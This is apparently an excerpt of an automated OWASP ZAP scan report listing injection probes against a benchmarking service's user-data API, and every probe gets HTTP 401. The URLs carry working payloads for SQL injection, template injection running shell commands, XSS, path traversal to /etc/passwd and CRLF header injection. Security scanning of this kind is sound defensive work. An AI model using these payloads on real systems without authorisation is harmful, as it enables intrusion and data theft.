* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%2528&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252F%252F1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252Fetc%252Fpasswd&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252Fuser-data&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%252FWEB-INF%252Fweb.xml&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2521--&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%255Cuser-data&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%255CWEB-INF%255Cweb.xml&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%255D%255D%253E&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%257Bsystem%2528%2522sleep+15%2522%2529%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=0W45pz4p&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=c%253A%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=c%253A%252FWindows%252Fsystem.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=c%253A%255C&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=c%253A%255CWindows%255Csystem.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=cat+%252Fetc%252Fpasswd&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=fCWSrSNGqDBejPDtEQlAbqUfpwfjSNIOLjdkhyFfnKGUJrigcRnhOwrelXugrfJGrdgyWnXwPnPrnXjvpshMwtrgZRCwtTTIwOnKIgZfttSxRtnsquJWYdhgOoLtoOBxpOULnDbyGJGLauaXTmatgPDdptPZhwgkJaukqgRsaQpQwefhPEYYZgEswQNYtEUZiBPGcPheIlrFifrSCqWBJmOiIZxuYxDvWNfWPsmgGIpInKqPDnThWABgnTsGuVwOkUiRhLhfiegDyGldHSTLNJqUNccyrLFIghIjyCiyPQqCihuWIPgkMBbdpRxSmZAiNSWmUdLpsncbgfgmcmIhooTXqsYDhqCmNkJQolVEsdwVXcMnBQaWSklEnovOLGowsqORnmiYKnVXXNjGioMyrxwuxZfYiGBnDJNHZOPeHcThjvGqxOQBUpmGjNtYBVXIdSigYdamdOnRCUdZwxTdvYsERGWrEZNIVsUVvCwQpipFyebnPGHwiPXZVeXaNEihciZoMCpAGcpWBowTdubcYoUFMxqMJrcXLGPICKmfxvFaVEfuGpMnxOyNjlGXLSSjTbXWDCKTScjbjexWdOTyaxwIZXEiGOYdVauREZEXOyHkInYiGRcuBqCkVMrEoSPAKPCXhUNFJqeLaKGQvWDcMorrDweHtoxATboNRmSYVFYUtpHIKGobrSeuCAvpPaScdpYBfdMSkYHDRVOKEjXGpcxXQFcKUUKTKgOvdcMqPBMSAteFwaZUTCJMMTghYytrrowJkYpurTnyfdHQGUnUJVvfWBJiSnlPiPRAUDvNSeBnublAvosdiJlMkvwWbhthAvOwPySLvOaIGOCSPpdRrdfrtoohseprNLADEVPDHvLwRBrSrDghMLfJpylgfeKqcaCeMdmrIquigmCyMjOYRjUdIcoeHywulkjsfBjLgdjoqFNelHfYTgylPOmFtEdXLwvAnxSeIDUinYHWtGpbjphfivLgsBXsSTgHqsNKrjamDntYuCwiFaytXrpUntlufXenxpIfdgpcmVMGkiXuUQInwdEljQsFWSivaSfMkBnMgxBctKNVgnsNxrVZBsGrMLUmrBBhtppVCJbXSgHdnCpEwioGuxhNuVPOiLLIUNflccCQlGLmucfPSfTUwNLeAGKpsxMmUAuxcxcPTaCAbilXFLMMDSwjAAIgQkGfTmmLxySwBqYWRVUpVXFtfCZDOSaCNhkDJMqQlApFQQcgBExRawqBtsgOxbfJyMwAuxaxXfAHaodumwvejlJNGLvKbXGZxmEqZVMydXgMZJpFZoylhIswSTpAjmoZBvUNPksgYnfpPhDfiwihBahGKaMTDRMFVwOTlghDDfUukRNdxindZSbigdIZkwPJhMRGuydGhhtZxSggTjtWSWhCPHWxauGXbRYIbdiZHwCkkaBkDtbgjuSBTeZyPwZlMltJJZWlrpqVeNiDsJZKiuJjuFUnDMFnpqtkWWxJsCwlpWNesEasUdggONJRHZfIJcJopsjGIImdNEBXYtGFdWJwogZyeeRtLeQFXLuQVYpdPhNTAGDZkLwHvSmGFxwqkAqfbanlbEQErEBfgOtWNhOckQvcfuWwuqyUteDaSCoatwOJopjRddtLJsErqYBVJSwoEjDsayNPPCUVgBqPoSvhYREkPhLjInjwCxFvCidDMlPMXEUeIfJkKXJnPlHoUoEFRMMxaBdWyeAaugyfayRGuSZMEEeKNYBLXXOCrISaOHNTDlKDfXpOmLpenYDkeokDrNsiInhlylcPLEcnfxxJqXEpBWuhYLXIpBSJtebqKOHAISjKScerGUtGobpOHKbPNCJsmjvfyFGPpdWHFPEPjcukHWSHhRUIJskRRkkrHXVxKdDRDkjAquvQKvQfWnFBrjjkcFYZOwFRnPwFIwYSYvQGWmSsPhuHyUKnfULAFodEHEZMkDdVZWypjymAJsHLTxVxOSlWDDJiXtvGElbBvPnxUfqIxuqmYAjDWmmohkYQAbPyGxiqcfQxMNDadpxgSvrkFMcCMDgBtEswpObDGcmYsEyCjSmsbISIcmyAljWtpXFYGEjPGITZiuIKrtVCdPNYjdhooDLg&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=get-help&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252F%255C1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252F1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252Fwww.google.com%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252Fwww.google.com%253A80%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=http%253A%252F%252Fwww.google.com&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=https%253A%252F%252F%255C1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
